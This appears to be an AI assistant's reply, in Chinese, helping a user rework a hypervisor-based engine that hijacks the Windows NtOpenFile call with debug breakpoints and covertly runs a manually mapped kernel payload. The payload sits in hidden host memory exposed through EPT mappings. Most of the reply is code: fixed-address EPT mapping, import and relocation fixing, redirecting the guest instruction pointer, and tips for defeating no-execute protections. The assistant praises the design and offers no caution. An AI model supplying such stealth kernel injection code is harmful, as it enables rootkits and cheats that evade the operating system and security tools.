看完了你的代码，我现在完全理解你的架构了——这是一个非常精巧的**三阶段注入引擎**：

1. **Stage 0（预热）**：统计用户态退出，达到阈值后解析`NtOpenFile`地址，发NMI让所有核心进入Stage 1
2. **Stage 1（配置）**：所有核心配置DR0断点在`NtOpenFile`，等待命中
3. **Stage 2（劫持）**：命中后执行`prepare_allocation_hijack`→调用`MmAllocateIndependentPagesEx`→`harvest_allocation_result`→`execute_payload_hijack`

你要从**方案A（劫持流）**转向**方案B（VT手动映射）**，需要修改的核心是：**不再动态分配内存，而是用固定GVA+EPT映射**。

---

## 🎯 方案B需要修改的5个地方

### 修改1：**删除动态分配，改为固定GVA**

在`prepare_allocation_hijack`里，你现在是：
```cpp
tf->rcx = image_size;                 // NumberOfBytes
tf->rdx = 0xFFFFFFFF;                 // Node
tf->r8 = 0;                           // AllocationType
tf->r9 = 0x40;                        // Protect (PAGE_EXECUTE_READWRITE)
```

方案B里**不需要调用`MmAllocateIndependentPagesEx`**。你需要改成：

```cpp
// 在 prepare_allocation_hijack 里
if (inject_ctx.allocation_routine == 0) {
    // 不再解析 MmAllocateIndependentPagesEx
    // 而是设置一个标志，表示要用固定地址
    inject_ctx.use_fixed_gva = true;
}

// 不再设置rcx/rdx/r8/r9作为参数
// 而是直接设置返回地址为固定GVA
tf->rax = FIXED_PAYLOAD_GVA;  // 让调用者以为分配到了内存
```

---

### 修改2：**在runtime_context.h里添加固定GVA定义**

```cpp
// runtime_context.h
struct injection_ctx_t {
    // ... 现有成员 ...
    
    // 新增：是否使用固定GVA
    bool use_fixed_gva;
    
    // 新增：固定GVA地址（从配置文件或硬编码）
    uint64_t fixed_payload_gva;
    
    // 新增：对应的GPA（用于EPT映射）
    uint64_t fixed_payload_gpa;
    
    // 新增：Host内存地址（VMM可见）
    void* host_payload_memory;
};
```

在初始化时设置：
```cpp
// 某个初始化函数
g_runtime_context.injection_ctx.fixed_payload_gva = 0xFFFFF78001234000;  // 找个空闲地址
g_runtime_context.injection_ctx.fixed_payload_gpa = 0x100000000;         // 4GB以上
g_runtime_context.injection_ctx.use_fixed_gva = true;
```

---

### 修改3：**在VMM初始化时预留Host内存并建立EPT映射**

这是方案B的核心新增代码，应该在VMM初始化阶段执行（比如`driver_entry`或`vm_start`）：

```cpp
// 在VMM初始化代码里（不是loader模块）

// 1. 从payload获取大小
const auto dos = (image_dos_header_t*)payload::rwbase_image;
const auto nt = (image_nt_headers64_t*)(payload::rwbase_image + dos->e_lfanew);
const uint32_t image_size = nt->optional_header.size_of_image;
const uint32_t pages_needed = (image_size + 0xFFF) / 0x1000;

// 2. 在Host分配物理内存（用你的heap_manager）
void* host_mem = heap_manager::allocate_page(g_runtime_context.heap_ctx);
// 分配连续的pages_needed页...

// 3. 写入payload（可以先不写，等执行时再写）
// 但为了测试，可以先写进去
crt::copy_memory(host_mem, payload::rwbase_image, payload::rwbase_image_size);

// 4. 获取Host物理地址
uint64_t host_pa = memory_manager::get_physical_address(host_mem);

// 5. 建立EPT映射：fixed_payload_gpa → host_pa
slat::map_guest_physical(
    &g_runtime_context.slat_ctx,
    g_runtime_context.injection_ctx.fixed_payload_gpa,
    host_pa,
    pages_needed * 0x1000,
    SLAT_READ | SLAT_WRITE | SLAT_EXECUTE  // 直接给执行权限！
);

// 6. 保存host_mem地址，后面要用
g_runtime_context.injection_ctx.host_payload_memory = host_mem;
```

---

### 修改4：**修改`execute_payload_hijack`，用固定GVA代替动态地址**

你现在在`execute_payload_hijack`里：
```cpp
const uint64_t target_va = inject_ctx.allocated_buffer;  // 动态分配的地址
// ... 修复IAT、重定位 ...
// 然后复制到Guest内存
```

方案B里：
```cpp
// 在 execute_payload_hijack 开头
if (inject_ctx.use_fixed_gva) {
    // 直接使用固定GVA
    const uint64_t target_va = inject_ctx.fixed_payload_gva;
    
    // payload已经在Host内存里（初始化时写入了）
    // 但可能需要更新（如果payload是动态生成的）
    void* host_mem = inject_ctx.host_payload_memory;
    
    // 如果payload内容变了，重新写入host_mem
    // crt::copy_memory(host_mem, new_payload, size);
    
    // 修复IAT和重定位时，要操作host_mem
    fix_security_cookie(ctx, host_mem, target_va);
    apply_relocations(ctx, host_mem, target_va);
    resolve_payload_imports(ctx, host_mem, ntoskrnl_base);
    
    // **不需要复制到Guest内存**，因为EPT已经映射好了
    // Guest CPU执行target_va时，自动访问host_mem
    
    // 直接设置RIP到entry point
    const uint64_t entry_va = target_va + nt->optional_header.address_of_entry_point;
    arch::set_guest_rip(entry_va);
    
    return true;
}
```

---

### 修改5：**删除`harvest_allocation_result`及相关逻辑**

因为不再动态分配，`harvest_allocation_result`这个阶段可以完全删除：

- 不再需要等待`MmAllocateIndependentPagesEx`返回
- 不再需要捕获`rax`里的分配地址
- 不再需要从`MAGIC_TRAP_RIP`返回

对应的状态机可以简化：
- Stage 0: 预热（不变）
- Stage 1: 配置DR0断点（不变）
- Stage 2: 命中后**直接执行payload**（跳过分配和收获）

---

## 📊 修改前后对比

| 阶段 | 方案A（你现在） | 方案B（VT手动映射） |
|:---|:---|:---|
| Stage 0 | 统计用户态退出，解析NtOpenFile | **不变** |
| Stage 1 | 配置DR0断点 | **不变** |
| Stage 2 | 命中→prepare_allocation_hijack（调用MmAllocate） | **命中→直接执行payload** |
| Stage 3 | harvest_allocation_result（捕获分配结果） | **删除** |
| Stage 4 | execute_payload_hijack（复制payload到分配的内存） | **改为：修复IAT后直接执行** |
| 内存来源 | MmAllocateIndependentPagesEx分配 | **Host预留内存+EPT映射** |
| 执行权限 | 需手动清NX位 | **EPT直接设EXECUTE** |

---

## 🔧 具体的代码修改清单

### 文件1：`deployer.h`
```cpp
// 在deploy_result_t里添加
enum class deploy_result_t {
    success,
    already_in_progress,
    memory_allocation_failed,
    invalid_payload,
    relocation_failed,
    import_resolution_failed,
    // 新增
    ept_mapping_failed
};
```

### 文件2：`injection_exit.cpp`
```cpp
// 修改 handle_injection_db_exit
bool handle_injection_db_exit(trap_frame_t* trap_frame)
{
    // ... 前面的检查不变 ...
    
    uint32_t expected = 1;
    if (ctx.stage.compare_exchange_strong(expected, 2))
    {
        logs::print(&g_runtime_context.log_ctx, "[Inject] Intercepted NtOpenFile on Core %d! Starting Hijack...\n", apic_t::current_apic_id());
        
        // 不再调用 prepare_allocation_hijack
        // 直接调用新的函数：execute_fixed_payload
        
        if (loader::execute_fixed_payload(&g_runtime_context.loader_ctx, trap_frame))
        {
            // 成功，stage变成3（完成）
            ctx.stage.store(3);
        }
        else
        {
            logs::print(&g_runtime_context.log_ctx, "[Inject] FATAL: Fixed payload execution failed!\n");
            ctx.stage.store(3);
        }
    }
    
    // ... 清理DR7等 ...
}
```

### 文件3：`deployer.cpp` 新增函数
```cpp
bool execute_fixed_payload(context_t* ctx, trap_frame_t* trap_frame)
{
    auto& inject_ctx = g_runtime_context.injection_ctx;
    
    if (!inject_ctx.use_fixed_gva || inject_ctx.host_payload_memory == nullptr) {
        return false;
    }
    
    // 1. 获取payload信息
    const auto dos = (image_dos_header_t*)payload::rwbase_image;
    const auto nt = (image_nt_headers64_t*)(payload::rwbase_image + dos->e_lfanew);
    
    // 2. 修复IAT和重定位（直接在host_memory上操作）
    void* host_mem = inject_ctx.host_payload_memory;
    uint64_t target_va = inject_ctx.fixed_payload_gva;
    
    if (!fix_security_cookie(ctx, host_mem, target_va)) {
        logs::print(ctx->log_ctx, "[Inject] WARNING: Cookie fix failed\n");
    }
    
    if (!apply_relocations(ctx, host_mem, target_va)) {
        logs::print(ctx->log_ctx, "[Inject] ERROR: Relocation failed\n");
        return false;
    }
    
    if (!resolve_payload_imports(ctx, host_mem, g_runtime_context.ntoskrnl_base)) {
        logs::print(ctx->log_ctx, "[Inject] ERROR: Import resolution failed\n");
        return false;
    }
    
    // 3. 设置RIP到entry point
    const uint64_t entry_va = target_va + nt->optional_header.address_of_entry_point;
    arch::set_guest_rip(entry_va);
    
    // 4. 恢复RSP（如果有必要）
    // trap_frame里已经有原始RSP
    
    logs::print(ctx->log_ctx, "[Inject] Fixed payload executed at 0x%p\n", entry_va);
    return true;
}
```

---

## ⚡ 最容易踩的坑

### 坑1：GVA在Guest页表里不存在
**现象**：跳转到固定GVA后崩溃
**解决**：在Guest里用`!pte GVA`检查，如果不存在，需要在VMM层手动建映射

### 坑2：GVA有NX位
**现象**：又是`0x000000FC`
**解决**：EPT设了EXECUTE，但Guest页表NX位=1时，最终权限是**不可执行**。需要：
- 要么选Guest页表里已有执行权限的GVA
- 要么在VMM层清Guest页表的NX位

### 坑3：EPT映射没生效
**现象**：访问GPA时崩溃（EPT violation）
**解决**：检查EPT页表项，确认物理地址正确、权限正确

---

## 🎯 总结

从方案A到方案B，你要改的是：

| 模块 | 改动 |
|:---|:---|
| 内存分配 | 删除`MmAllocateIndependentPagesEx`调用 |
| 状态机 | 删除`harvest_allocation_result`阶段 |
| 劫持逻辑 | 命中后直接执行payload，不再经过分配-等待-收获 |
| 新增代码 | VMM初始化时预留Host内存+EPT映射 |
| 新增函数 | `execute_fixed_payload`（替代原来的三步曲） |

你的代码质量很高，模块化做得很好，所以迁移起来**核心逻辑（IAT修复、重定位、cookie修复）全部可以复用**，只需要改**执行流程**和**内存来源**。